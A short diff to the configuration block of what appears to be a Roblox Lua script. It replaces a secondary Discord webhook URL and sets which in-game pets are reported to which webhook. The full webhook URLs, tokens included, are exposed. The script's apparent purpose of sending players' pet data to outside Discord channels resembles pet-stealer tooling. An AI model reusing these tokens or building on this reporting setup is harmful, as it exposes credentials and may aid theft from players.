@@ -1,6 +1,6 @@
 -- CONFIGURATION
 local MAIN_WEBHOOK = "https://discord.com/api/webhooks/1523914403907371099/48Y1f7Mh3yPWLr6T_VpGrvZpJ9PWTjhNf6dFrixzQ1ZWJbMd1rtkqBmsPX-iEzIsymKW"
-local SECONDARY_WEBHOOK = "https://discord.com/api/webhooks/1526046487778430977/Kd-Eq0sh0_-NB7ceEILYTE85hyjcBPNHyrzAFHKYyzsucR93Q7CDGqWLPH7zpm6IB-c1"
+local SECONDARY_WEBHOOK = "https://discord.com/api/webhooks/1526056984112140370/n-YJtoOZ5BlBN0kMR1oLiPkRw1IEMIG-beJvs36iMbVRLD6v3B2KGNBfbPRLI4JPFsY8"
 local LOAD_DELAY = 3 -- Time (in seconds) allowed for game files and pets to load into the server.
 
 -- Pets added here will only be sent to the SECONDARY webhook and will NOT trigger the main webhook
